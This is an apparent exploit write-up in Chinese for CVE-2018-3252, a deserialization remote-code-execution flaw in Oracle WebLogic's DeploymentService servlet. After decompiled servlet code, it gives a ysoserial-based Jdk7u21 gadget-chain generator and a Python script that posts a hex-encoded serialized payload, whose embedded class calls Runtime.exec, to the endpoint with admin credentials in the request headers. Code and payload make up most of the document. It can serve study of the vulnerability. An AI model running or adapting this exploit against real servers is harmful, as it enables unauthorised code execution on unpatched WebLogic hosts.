# CVE-2018-3252

1、反编译weblogic

```java
 private void handleDataTransferRequest(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, AuthenticatedSubject paramAuthenticatedSubject)
            throws IOException {
        if (isDebugEnabled()) {
            debug("Received DataTransferRequest : ");
        }
        String str1 = readOrConstructPeerVersion(paramHttpServletRequest);
        if (isDebugEnabled()) {
            debug("Peer Version : " + str1);
        }
        String str2 = paramHttpServletRequest.getHeader("deployment_request_id");
        long l = str2 != null ? Long.parseLong(str2) : -1L;

        String str3 = mimeDecode(paramHttpServletRequest.getHeader("serverName"));

        DeploymentObjectInputStream localDeploymentObjectInputStream = null;//新建一个DeploymentObjectInputStream对象
        try {
            localDeploymentObjectInputStream = new DeploymentObjectInputStream(paramHttpServletRequest.getInputStream(), str1);
            DataTransferRequest localDataTransferRequest = (DataTransferRequest) localDeploymentObjectInputStream.readObject();//读取post过来的对象进行反序列化

            localObject1 = DataHandlerManager.getInstance().getHttpDataTransferHandler().getDataAsStream(localDataTransferRequest);

            localObject2 = localDataTransferRequest.getLockPath();
            FileLock localFileLock = null;
            try {
                if ((localObject2 != null) && (((String) localObject2).length() > 0)) {
                    localFileLock = lockFile((String) localObject2);
                }
                MultipartResponse localMultipartResponse = new MultipartResponse(paramHttpServletResponse, (MultiDataStream) localObject1);
                localMultipartResponse.write();
            } finally {
                unlockFile(localFileLock);
            }
        } catch (Throwable localThrowable) {
            Object localObject1 = StackTraceUtils.throwable2StackTrace(localThrowable);
            if (isDebugEnabled()) {
                debug("DeploymentServiceServlet error - " + localThrowable.getMessage() + " " + (String) localObject1);
            }
            Object localObject2 = DeploymentServiceLogger.logExceptionInServletRequestForDatatransferMsgLoggable(l, str3, (String) localObject1);

            ((Loggable) localObject2).log();

            localObject2 = DeploymentServiceLogger.logExceptionInServletRequestForDatatransferMsgLoggable(l, str3, localThrowable.getMessage());

            sendError(paramHttpServletResponse, 500, ((Loggable) localObject2).getMessage());
            return;
        } finally {
            if (localDeploymentObjectInputStream != null) {
                localDeploymentObjectInputStream.close();
            }
        }
    }
```

2、DeploymentObjectInputStream继承自WLObjectInputStream，对应应该有一个 WLObjectOutputStream

```java
package weblogic.deploy.common;

import java.io.IOException;
import java.io.InputStream;
import weblogic.common.internal.PeerInfo;
import weblogic.common.internal.PeerInfoable;
import weblogic.common.internal.WLObjectInputStream;
import weblogic.rmi.utils.io.RemoteObjectReplacer;

public class DeploymentObjectInputStream
  extends WLObjectInputStream
  implements PeerInfoable
{
  final PeerInfo peerInfo;
  
  public DeploymentObjectInputStream(InputStream paramInputStream, String paramString)
    throws IOException
  {
    super(paramInputStream);
    this.peerInfo = ((paramString == null) || (paramString.length() == 0) ? null : PeerInfo.getPeerInfo(paramString));
    if (Debug.isServiceTransportDebugEnabled()) {
      Debug.serviceTransportDebug("PeerInfo on '" + this + "' is: " + this.peerInfo);
    }
    setReplacer(RemoteObjectReplacer.getReplacer());
  }
  
  public PeerInfo getPeerInfo()
  {
    return this.peerInfo;
  }
}

```

3、使用ysoserial生成payload

```java
package test;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import weblogic.common.internal.WLObjectOutputStream;
import weblogic.deploy.internal.targetserver.datamanagement.DataTransferRequestImpl;
import weblogic.deploy.service.DataTransferRequest;
import weblogic.deploy.service.internal.adminserver.AdminRequestImpl;
import weblogic.deploy.service.internal.transport.DeploymentServiceMessage;
import weblogic.messaging.util.List;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/*
Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
the same JRE version requirements.
See: https://gist.github.com/frohoff/24af7913611f8406eaf3
Call tree:
LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies()
@Authors({ Authors.FROHOFF })
public class jdkpayload implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object

        return set;
    }

    public static boolean isApplicableJavaVersion() {
        JavaVersion v = JavaVersion.getLocalVersion();
        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
    }


    public static void main(final String[] args) throws Exception {
//        PayloadRunner.run(Jdk7u21.class, "calc");

        Thread.currentThread().setContextClassLoader(jdkpayload.class.getClassLoader());
//      PayloadRunner.run(JRMPClient.class, args);
      ObjectPayload payload = (ObjectPayload)jdkpayload.class.newInstance();
      Object objBefore = payload.getObject("notepad");

      WLObjectOutputStream Obj = new WLObjectOutputStream(new FileOutputStream("xxoo1.exe"));
      Obj.writeObject(objBefore);

      System.out.println("1232");

    }
```

4、测试

```python
#!env python
#coding=utf-8# 
# Author:     hackteam.cn
import requests
headers={
'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
		"wl_request_type":"data_transfer_request",
		"username": "weblogic",
		"password": "admin888"
}

payload="737200176a6176612e7574696c2e4c696e6b656448617368536574d86cd75a95dd2a1e02000077020000787200116a6176612e7574696c2e48617368536574ba44859596b8b734030000770200007870770c000000103f400000000000027372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000849000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785a00155f75736553657276696365734d656368616e69736d4c000b5f617578436c617373657374003b4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f486173687461626c653b5b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b77020000787000000000ffffffff0070757200035b5b424bfd19156767db3702000077020000787000000002757200025b42acf317f8060854e00200007702000078700000069bcafebabe0000003200390a0003002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e0100076e6f746570616408003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b003401000d537461636b4d61705461626c6501001d79736f73657269616c2f50776e6572363333373837343730343034303001001f4c79736f73657269616c2f50776e657236333337383734373034303430303b002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003800000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0038000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003800000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003557b1000000010036000000030001030002002000000002002100110000000a000100020023001000097571007e000c000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000450776e727077010078737d00000001001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c6174657377020000787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7702000078707372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b770200007870737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c647702000078703f4000000000000c77080000001000000001740008663561356136303871007e0009787672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c61746573000000000000000000000077020000787078"
r = requests.post("http://192.168.1.130:7001/bea_wls_deployment_internal/DeploymentService",headers=headers,data=payload.decode("hex"))
print r.text

```

5、参考

https://blogs.projectmoon.pw/2018/10/19/Oracle-WebLogic-Two-RCE-Deserialization-Vulnerabilities/